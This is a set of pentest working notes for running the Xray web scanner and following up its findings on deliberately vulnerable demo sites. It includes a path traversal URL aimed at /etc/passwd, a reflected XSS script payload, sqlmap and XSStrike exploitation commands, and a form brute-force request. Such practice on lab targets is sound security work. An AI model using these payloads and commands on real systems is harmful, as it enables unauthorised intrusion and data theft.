Web Vulnerability Scanning
./xray_linux_amd64 webscan --basic-crawler http://testfire.net --html-output ddosi.org.html

Set Proxy Scan (Passive Scan)
./xray_linux_amd64 webscan --listen 127.0.0.1:8888 --html-output output.html

Output format (can use one or both output formats)
References: (1) https://github.com/chaitin/xray (2) https://docs.xray.cool/
--html-output
--json-output

Testing websites
(1) http://www.testfire.net
(2) http://testphp.vulnweb.com

Check Xray version
./xray_linux_amd64 version

Check Xray update
./xray_linux_amd64 upgrade

=============================================================

(1) plugin = baseline/sensitive/server-error (json output file)
Step ==> Visit the URL address "addr" & use cutycapt to take screen shot at "addr" - https://www.testfire.net/index.jsp?content=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
Command ==> cutycapt --url=https://www.testfire.net/index.jsp?content=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd --out=testfire-server-error.png

(2) plugin = xss/reflected/default
Step ==> Use XSStrike to exploit XSS at "addr" and take screen shot / save HTML source with input phrase or script
https://www.testfire.net/index.jsp?content=inside_contact.htm
https://www.testfire.net/search.jsp?query=%3CsCrIpT%3Eymkvnkcxeo%3C%2FsCrIpT%3E
Command ==> python3 xsstrike.py --crawl -u https://www.testfire.net/index.jsp?content=inside_contact.htm
Command ==> python3 xsstrike.py --crawl -u https://www.testfire.net/search.jsp?query=%3CsCrIpT%3Eymkvnkcxeo%3C%2FsCrIpT%3E
Note: Install XSStrike
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip3 install -r requirements.txt

(3) plugin = sqldet/blind-based/default
Step ==> Use sqlmap to exploit SQL injection (SQLi) at "addr" with VARIABLE "cat" and save sqlmap output
http://testphp.vulnweb.com/listproducts.php?cat=1
Command ==> sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1;

(3a) plugin = sqldet/blind-based/default
Step ==> Use sqlmap to exploit SQL injection (SQLi) at "addr" without VARIABLE and save sqlmap output
http://testphp.vulnweb.com/scured/newuser.php 
Command ==> sqlmap -u http://testphp.vulnweb.com/scured/newuser.php --crawl=30

(4) plugin = sqldet/error-based/default
Step ==> Use sqlmap to exploit SQL injection (SQLi) at "addr" and save sqlmap output
http://testphp.vulnweb.com/listproducts.php?cat=1
Command ==> sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1;

(5)plugin = dirscan/directory/default
Step ==> Visit the URL address at "addr" and use cutycapt to take screen shot
http://testphp.vulnweb.com/images/
Command ==> cutycapt --url=http://testphp.vulnweb.com/images/ --out=vulnweb-dirscan.png  

(6) plugin = dirscan/sensitive/crossdomain
Step ==> Visit the URL address at "addr" and use cutycapt to take screen shot
http://testphp.vulnweb.com/crossdomain.xml
Command ==> cutycapt --url=http://testphp.vulnweb.com/crossdomain.xml --out=vulnweb-crossdomain.png

(7) plugin = dirscan/config/ide
Step ==> Visit the URL address at "addr" and use cutycapt to take screen shot
http://testphp.vulnweb.com/.idea/workspace.xml
Command ==> cutycapt --url=http://testphp.vulnweb.com/.idea/workspace.xml --out=vulnweb-ide.png

(8) plugin = dirscan/backup/default
Step ==> Visit the URL address at "addr" and use cutycapt to take screen shot on the download backup file
http://testphp.vulnweb.com/index.bak
Command ==> cutycapt --url=http://testphp.vulnweb.com/index.bak --out=vulnweb-backup.png

(9) plugin = dirscan/config/htaccess
Step ==> Visit the URL address at "addr" and use cutycapt to take screen shot on the download htaccess file
http://testphp.vulnweb.com/Mod_Rewrite_Shop/.htaccess
Command ==> cutycapt --url=http://testphp.vulnweb.com/Mod_Rewrite_Shop/.htaccess --out=vulnweb-htaccess.png

(10) plugin = dirscan/debug/php
Step ==> Visit the URL address at "addr" and use cutycapt to take screen shot
http://testphp.vulnweb.com/secured/phpinfo.php
Command ==> cutycapt --url=http://testphp.vulnweb.com/secured/phpinfo.php --out=vulnweb-debug-php.png

(11) Plugin = poc-yaml-phpstudy-nginx-wrong-resolve
Step ==> Visit the URL address at "addr" and use cutycapt to take screen shot
http://testphp.vulnweb.com/AJAX/index.php
Command ==> cutycapt --url=http://testphp.vulnweb.com/AJAX/index.php --out=vulnweb-debug-php.png

(12) Plugin = brute-force/form-brute/default
Step1 ==> Visit the URL address at "addr" and identify username field value and password field value 
For example:
		"addr": "http://testphp.vulnweb.com/userinfo.php",
		"extra": {
			"from_url": "http://testphp.vulnweb.com/login.php",
			"param": {
				
			},
			"password": {
				"field": "pass",
				"value": "test"
			},
			"username": {
				"field": "uname",
				"value": "test"
			}
Step2 ==> Output "snapshot" 
For example:
		"snapshot": [["POST /userinfo.php HTTP/1.1\r\nHost: testphp.vulnweb.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\r\nContent-Length: 20\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: http://testphp.vulnweb.com/login.php\r\nAccept-Encoding: gzip\r\n\r\npass=test\u0026uname=test",
		"HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: text/html; charset=UTF-8\r\nDate: Sat, 17 Dec 2022 11:40:50 GMT\r\nServer: nginx/1.19.0\r\nSet-Cookie: login=test%2Ftest\r\nX-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1\r\n\r\n\u003c...

(13) Plugin = path-traversal/path-traversal/default
Step ==> Visit the URL address at "addr" and use cutycapt to take screen shot
http://testphp.vulnweb.com/images/
Command ==> cutycapt --url=http://testphp.vulnweb.com/images/ --out=vulnweb-dirscan.png


